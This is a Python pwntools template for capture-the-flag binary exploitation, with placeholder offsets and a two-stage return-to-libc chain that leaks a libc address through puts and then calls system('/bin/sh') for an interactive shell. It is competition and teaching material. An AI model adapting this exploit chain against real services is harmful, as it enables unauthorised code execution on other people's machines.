#!/usr/bin/env python3
"""
ctf/template_pwn.py — CTF Binary Exploitation Solve Template
NuRichter · CySec Arsenal

Edit the CONFIG section and fill in the exploit logic.
"""
from pwn import *

# ─── CONFIG ──────────────────────────────────────────────────────────────────
BINARY   = "./vuln"
LIBC     = "./libc.so.6"        # or "" if not needed
REMOTE   = ("challenge.ctf.io", 1337)

context.binary = BINARY
# context.log_level = "debug"    # Uncomment for verbose

# ─── HELPERS ─────────────────────────────────────────────────────────────────
elf  = ELF(BINARY, checksec=False)
rop  = ROP(elf)
libc = ELF(LIBC, checksec=False) if LIBC else None


def conn() -> tube:
    if args.REMOTE:
        return remote(*REMOTE)
    elif args.GDB:
        return gdb.debug(BINARY, gdbscript=GDB_SCRIPT)
    else:
        return process(BINARY)


GDB_SCRIPT = """
set follow-fork-mode child
break main
continue
"""

# ─── OFFSETS (fill these in after analysis) ───────────────────────────────────
OFFSET          = 0          # buffer overflow offset to RIP/EIP
POP_RDI         = 0          # pop rdi; ret gadget
RET_GADGET      = 0          # ret gadget (stack alignment)
SYSTEM_PLT      = elf.plt.get("system", 0)
PUTS_PLT        = elf.plt.get("puts", 0)
PUTS_GOT        = elf.got.get("puts", 0)
MAIN_ADDR       = elf.symbols.get("main", 0)
BINSH_OFFSET    = 0          # offset in libc


# ─── STAGE 1: Leak libc (if PIE/ASLR) ───────────────────────────────────────
def leak_libc(p: tube) -> int:
    """Leak a libc address via puts@plt -> calculate base."""
    log.info("Stage 1: Leaking libc...")

    payload  = b"A" * OFFSET
    payload += p64(POP_RDI)
    payload += p64(PUTS_GOT)
    payload += p64(RET_GADGET)
    payload += p64(PUTS_PLT)
    payload += p64(MAIN_ADDR)   # return to main for stage 2

    p.sendlineafter(b">>>", payload)   # adjust prompt as needed
    p.recvline()

    leak = u64(p.recvline().strip().ljust(8, b"\x00"))
    log.success(f"puts @ {hex(leak)}")

    if libc:
        libc.address = leak - libc.symbols["puts"]
        log.success(f"libc base: {hex(libc.address)}")
        return libc.address
    return 0


# ─── STAGE 2: Shell ──────────────────────────────────────────────────────────
def get_shell(p: tube):
    """Send final payload for shell."""
    log.info("Stage 2: Getting shell...")

    if libc:
        system  = libc.symbols["system"]
        binsh   = next(libc.search(b"/bin/sh"))
    else:
        system  = SYSTEM_PLT
        binsh   = next(elf.search(b"/bin/sh"))

    payload  = b"A" * OFFSET
    payload += p64(RET_GADGET)   # stack alignment
    payload += p64(POP_RDI)
    payload += p64(binsh)
    payload += p64(system)

    p.sendlineafter(b">>>", payload)
    log.success("Payload sent — enjoy your shell! 🐚")
    p.interactive()


# ─── MAIN ────────────────────────────────────────────────────────────────────
def main():
    p = conn()

    # Uncomment stages as needed:
    # leak_libc(p)
    # get_shell(p)

    # Or go straight to interactive for manual inspection:
    p.interactive()


if __name__ == "__main__":
    main()
